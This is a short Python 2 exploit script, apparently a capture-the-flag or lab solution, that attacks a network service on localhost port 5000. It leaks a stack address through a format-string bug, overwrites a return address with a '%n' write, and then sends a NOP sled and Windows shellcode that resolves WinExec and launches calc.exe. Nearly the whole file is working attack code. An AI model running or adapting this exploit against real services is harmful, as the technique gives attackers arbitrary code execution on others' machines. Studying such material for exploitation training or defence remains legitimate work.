import socket
import struct
import time


host = "127.0.0.1"
port = 5000
shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"

payload = '\x70\x02\x00\x00'
payload2 = 'aaaa%p%p%p%p%p%p%p%p%p%p'
payload4 = 'QUIT\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'+shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
s.send(payload)
time.sleep(0.5)
s.send(payload2)

a = s.recv(1024)
b = int(a[101:109], 16)
addr_ret = b+644

temp = (b - 283) / 6 + 2
payload3 = 'CCCCCCCCCCCCCCCCCCCC%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%' + str(temp) + 'x%' + str(temp) + 'x%' + str(temp) + 'x%' + str(temp) + 'x%' + str(temp) + 'x%' + str(temp) +'x%n'
payload3 += struct.pack('<I', addr_ret) 

s.send(payload3)
time.sleep(0.5)
s.send(payload4)
raw_input()

#19fd70
#\x70\xfd\x19\x00
